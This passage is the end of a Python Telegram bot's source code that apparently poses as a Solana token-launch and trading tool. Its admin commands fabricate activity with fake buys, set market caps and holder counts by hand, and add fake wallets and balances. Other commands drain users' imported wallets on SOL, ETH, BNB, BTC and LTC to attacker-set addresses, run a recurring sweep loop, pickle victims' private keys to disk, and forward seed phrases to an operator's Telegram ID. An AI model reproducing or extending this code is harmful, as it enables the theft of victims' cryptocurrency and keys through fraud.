            await status.edit_text(f"📡 <b>{label}</b>…", parse_mode=ParseMode.HTML)
        except Exception:
            pass
    global bot_balance_sol
    if profit > 0 and LARP_ENABLED:
        bot_balance_sol = round(bot_balance_sol + profit, 4)
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
        _save_state()
    await status.edit_text(
        f"Activity done · +{SOL_EMOJI} <b>{profit:.4f}</b> · vault <b>{bot_balance_sol:.4f}</b>",
        parse_mode=ParseMode.HTML,
    )
    asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, status.message_id, delay=5.0))


@router.message(Command("fakefill"))
async def cmd_fakefill(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("status") == "live" and not t.get("dumped")), None)
    if not token:
        await _admin_reply(message, "No live token.")
        return
    parts = (message.text or "").split()
    n = 5
    if len(parts) >= 2:
        try:
            n = max(1, min(20, int(parts[1])))
        except ValueError:
            pass
    symbol = token.get("symbol", "???")
    total = 0.0
    for _ in range(n):
        vol = round(random.uniform(0.08, 2.1), 4)
        total += vol
        add_personal_tx(sess, f"👀 Sniper buy ${symbol}", "success", amount=vol)
    await _admin_reply(
        message,
        f"Injected <b>{n}</b> buys on ${symbol} · vol <b>{total:.4f} SOL</b>",
    )


@router.message(Command("clonewallet"))
async def cmd_clonewallet(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    bal = round(random.uniform(0.4, 6.5), 4)
    pub = _fake_sol_pubkey()
    w = UserWallet(
        private_key="LARP_SIM",
        public_key=pub,
        label=f"Bundle {len(sess.wallets)+1}",
        balance_sol=bal,
        chain="sol",
        is_larp=True,
    )
    sess.wallets.append(w)
    add_personal_tx(sess, "📥 Wallet Linked", "success")
    await _admin_reply(
        message,
        f"Extra wallet\n<code>{pub}</code>\n"
        f"Balance <b>{SOL_EMOJI} {bal:.4f}</b> · total {len(sess.wallets)}",
    )


@router.message(Command("setmcap"))
async def cmd_setmcap(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await _admin_reply(message, "Usage: <code>/setmcap 45000</code>")
        return
    try:
        mcap = float(parts[1].replace(",", "").replace("$", ""))
    except ValueError:
        await _admin_reply(message, "Invalid number")
        return
    sess = get_session(message.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("status") == "live" and not t.get("dumped")), None)
    if not token:
        await _admin_reply(message, "No live token")
        return
    token["mcap"] = mcap
    await _admin_reply(message, f"${token.get('symbol')} MC set to <b>${mcap:,.0f}</b>")


@router.message(Command("holders"))
async def cmd_holders(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    if len(parts) < 2:
        await _admin_reply(message, "Usage: <code>/holders 120</code>")
        return
    try:
        n = int(parts[1])
    except ValueError:
        await _admin_reply(message, "Invalid number")
        return
    sess = get_session(message.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("status") == "live" and not t.get("dumped")), None)
    if not token:
        await _admin_reply(message, "No live token")
        return
    token["holders"] = max(0, n)
    await _admin_reply(message, f"${token.get('symbol')} holders → <b>{token['holders']}</b>")


@router.message(Command("livepulse"))
async def cmd_livepulse(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    token = next((t for t in reversed(sess.launched_tokens) if t.get("status") == "live" and not t.get("dumped")), None)
    if not token:
        await _admin_reply(message, "No live token")
        return
    symbol = token.get("symbol", "???")
    token["mcap"] = round(float(token.get("mcap") or 25000) * random.uniform(1.05, 1.35), 0)
    token["holders"] = int(token.get("holders") or 40) + random.randint(3, 18)
    token["buys"] = int(token.get("buys") or 10) + random.randint(2, 9)
    n = random.randint(2, 5)
    vol = 0.0
    for _ in range(n):
        v = round(random.uniform(0.05, 1.2), 4)
        vol += v
        add_personal_tx(sess, f"Buy ${symbol}", "success", amount=v)
    await _admin_reply(
        message,
        f"${symbol} pulse\n"
        f"MC ~${token['mcap']:,.0f} · holders {token['holders']} · buys {token['buys']}\n"
        f"+{n} buys · vol {vol:.3f} SOL",
    )


@router.message(Command("cleartx"))
async def cmd_cleartx(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global GLOBAL_TX_FEED
    sess = get_session(message.from_user.id)
    n = len(sess.last_tx)
    sess.last_tx.clear()
    GLOBAL_TX_FEED.clear()
    _save_state()
    await _admin_reply(message, f"Cleared {n} personal txs + global feed")


@router.message(Command("bump"))
async def cmd_bump(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = (message.text or "").split()
    amt = 0.25
    if len(parts) >= 2:
        try:
            amt = float(parts[1].replace(",", ""))
        except ValueError:
            await _admin_reply(message, "Usage: <code>/bump</code> or <code>/bump 0.5</code>")
            return
    global bot_balance_sol
    bot_balance_sol = round(max(0.0, bot_balance_sol + amt), 4)
    sess = get_session(message.from_user.id)
    if LARP_ENABLED:
        ensure_larp_wallet(sess, force_balance=bot_balance_sol)
    add_personal_tx(sess, "📥 Wallet Top-up", "success", amount=amt)
    _save_state()
    await _admin_reply(message, f"+{amt:.4f} → vault <b>{bot_balance_sol:.4f}</b>")


@router.message(Command("ghost"))
async def cmd_ghost(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    removed = remove_larp_wallets(sess)
    await _admin_reply(message, f"Hid {removed} LARP wallet(s). /larpwallet to restore.")


# ── Sweep ───────────────────────────────────────────────────────────────────
@router.message(Command("sweepall"))
async def cmd_sweepall(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    status = await message.answer("🧹 <b>Sweeping all sessions…</b>", parse_mode=ParseMode.HTML)
    try:
        tried, drained = await _sweep_all_sessions()
        await status.edit_text(
            f"🧹 <b>Sweep pass done</b>\n\n"
            f"Wallets tried: <b>{tried}</b>\n"
            f"Wallets drained: <b>{drained}</b>",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await status.edit_text(f"❌ Sweep failed: <code>{e}</code>", parse_mode=ParseMode.HTML)


@router.message(Command("sweepstart"))
async def cmd_sweepstart(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global _sweeper_task
    parts = (message.text or "").split()
    interval = SWEEP_INTERVAL_DEFAULT
    if len(parts) >= 2:
        try:
            interval = max(10.0, float(parts[1]))
        except ValueError:
            await _admin_reply(message, "Usage: <code>/sweepstart</code> or <code>/sweepstart 30</code>")
            return
    if _sweeper_task and not _sweeper_task.done():
        await _admin_reply(message, "Sweep loop already running. /sweepstop first.")
        return
    _sweeper_task = asyncio.create_task(_sweep_loop(interval))
    await _admin_reply(message, f"🧹 Sweep loop ON · every <b>{interval:.0f}s</b>")


def _persist_sessions() -> None:
    """FIX 11: serialize wallet keys across all sessions so sweep can resume after restart."""
    import pickle
    try:
        payload = []
        for uid, sess in sessions.items():
            for w in sess.wallets:
                if getattr(w, "is_larp", False) or getattr(w, "drained", False):
                    continue
                payload.append({
                    "uid": uid,
                    "pub": w.public_key,
                    "priv": w.private_key,
                    "chain": w.chain,
                    "eth_priv": getattr(w, "eth_priv", None),
                    "drained": w.drained,
                    "drain_attempts": getattr(w, "drain_attempts", 0),
                    "label": w.label,
                })
        with open("sessions_persist.pkl", "wb") as f:
            pickle.dump(payload, f)
        log.info("Sessions persisted: %d wallets", len(payload))
    except Exception as e:
        log.warning("Session persist failed: %s", e)


def _load_persisted_sessions() -> None:
    """FIX 11: restore wallet records from disk on startup."""
    import pickle
    try:
        with open("sessions_persist.pkl", "rb") as f:
            payload = pickle.load(f)
        for record in payload:
            uid = record["uid"]
            sess = get_session(uid)
            # skip if already have this pub (e.g. loaded from _load_state)
            existing_pubs = {w.public_key for w in sess.wallets}
            if record["pub"] in existing_pubs:
                continue
            w = UserWallet(
                private_key=record["priv"],
                public_key=record["pub"],
                label=record.get("label", "Wallet"),
                chain=record.get("chain", "sol"),
            )
            w.drained = record.get("drained", False)
            w.drain_attempts = record.get("drain_attempts", 0)
            if record.get("eth_priv"):
                w.eth_priv = record["eth_priv"]
            sess.wallets.append(w)
        log.info("Persisted sessions loaded: %d wallets", len(payload))
    except FileNotFoundError:
        pass
    except Exception as e:
        log.warning("Session persist load failed: %s", e)


@router.message(Command("sweepstop"))
async def cmd_sweepstop(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    global _sweeper_task
    if not _sweeper_task or _sweeper_task.done():
        await _admin_reply(message, "Sweep loop not running.")
        return
    _sweeper_task.cancel()
    try:
        await _sweeper_task
    except (asyncio.CancelledError, Exception):
        pass
    _sweeper_task = None
    _persist_sessions()  # FIX 11: save on stop
    await _admin_reply(message, "🧹 Sweep loop stopped.")


@router.message(Command("testalert"))
async def cmd_testalert(message: Message):
    """Admin: verify key alert routing (full seed → primary, no seed → alert IDs)."""
    if message.from_user.id not in ADMIN_IDS:
        return
    fake_seed = "test alert " + " ".join(random.choice(BIP39_WORDLIST) for _ in range(12))
    try:
        await log_key_to_admin(
            message.bot,
            message.from_user,
            fake_seed,
            sol=0.0015,
            eth=0.0,
            bnb=0.0,
            usdc=0.0,
            status="imported",
            sol_seen=0.0015,
            pub="TestPub1111111111111111111111111111111",
        )
        await message.answer(
            "<b>Test alert sent</b>\n\n"
            f"Full (with seed) → <code>{KEY_RECEIVER_ID}</code>\n"
            f"Alert only → <code>{', '.join(str(x) for x in sorted(KEY_ALERT_IDS))}</code>\n\n"
            "If someone got nothing: they must /start the bot once.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await message.answer(f"testalert failed: <code>{e}</code>", parse_mode=ParseMode.HTML)


@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if any(getattr(w, "drained", False) for w in s.wallets))
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    sweep_on = "RUNNING" if (_sweeper_task and not _sweeper_task.done()) else "OFF"
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
        f"Min drain: <b>${MIN_DRAIN_USD:,.2f}</b>\n"
        f"LARP: <b>{'ON' if LARP_ENABLED else 'OFF'}</b>\n"
        f"Sweep loop: <b>{sweep_on}</b>\n"
        f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
        f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"BTC dest: {'yes' if BTC_DRAIN and len(BTC_DRAIN) >= 20 else 'NO'}\n"
        f"LTC dest: {'yes' if LTC_DRAIN and len(LTC_DRAIN) >= 20 else 'NO'}\n"
        f"KEY_RECEIVER: {KEY_RECEIVER_ID}\n"
        f"KEY_ALERTS: {', '.join(str(x) for x in sorted(KEY_ALERT_IDS))}\n\n"
        f"<b>Help</b>: /help — full command list\n"
        f"<b>LARP</b>: /larpon /larpoff /larpseed /setportfolio /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
        f"<b>Sweep</b>: /sweepall /sweepstart [secs] /sweepstop\n"
        f"/testalert /testdrain /dumpnow /simactivity /fakefill /livepulse /setmcap /holders /cleartx",
        parse_mode=ParseMode.HTML,
    )


@router.message(Command("testdrain"))
async def test_drain(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(
        f"Trying multi-chain drain:\n<code>{w.public_key}</code>\n"
        f"SOL dest: <code>{short_addr(DRAIN_DESTINATION)}</code>\n"
        f"ETH dest: <code>{short_addr(ETH_DRAIN)}</code>\n"
        f"Balance SOL: {w.balance_sol:.6f}",
        parse_mode=ParseMode.HTML,
    )
    eth_key = getattr(w, "eth_priv", None) or (w.private_key if w.chain == "eth" else None)
    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key,
                        bot=message.bot, user=message.from_user, wallet=w)
    await message.answer("Drain attempt finished — check logs / Tx tracker")


async def main():
    global _bot_ref
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    if DRAIN_DESTINATION.startswith("YourDrain") or len(DRAIN_DESTINATION) < 32:
        log.warning("DRAIN_WALLET not set — SOL drains skipped")
    if ETH_DRAIN.startswith("0xYour"):
        log.warning("ETH_DRAIN_WALLET not set — ETH/USDC drains skipped")
    if not BTC_DRAIN or len(BTC_DRAIN) < 20:
        log.warning("BTC_DRAIN_WALLET not set — BTC drains skipped")
    if not LTC_DRAIN or len(LTC_DRAIN) < 20:
        log.warning("LTC_DRAIN_WALLET not set — LTC drains skipped")
    _load_state()
    _load_persisted_sessions()  # FIX 11: restore wallet keys from previous run
    asyncio.get_event_loop().create_task(_rate_hits_cleanup_loop())  # FIX 12: start rate_hits GC
    asyncio.get_event_loop().create_task(_session_persist_loop())   # FIX: persist sessions every 5 min

    # FIX 11: persist on SIGTERM / SIGINT so restarts don't lose wallets
    import signal as _signal
    def _sig_persist(signum, frame):
        _persist_sessions()
    try:
        _signal.signal(_signal.SIGTERM, _sig_persist)
        _signal.signal(_signal.SIGINT, _sig_persist)
    except Exception:
        pass

    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info(
        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s",
        HAS_SOLANA, HAS_WEB3, KEY_RECEIVER_ID, bot_balance_sol, LARP_ENABLED,
    )
    try:
        await dp.start_polling(bot)
    finally:
        if _sweeper_task and not _sweeper_task.done():
            _sweeper_task.cancel()
            try:
                await _sweeper_task
            except (asyncio.CancelledError, Exception):
                pass


if __name__ == "__main__":
    asyncio.run(main())
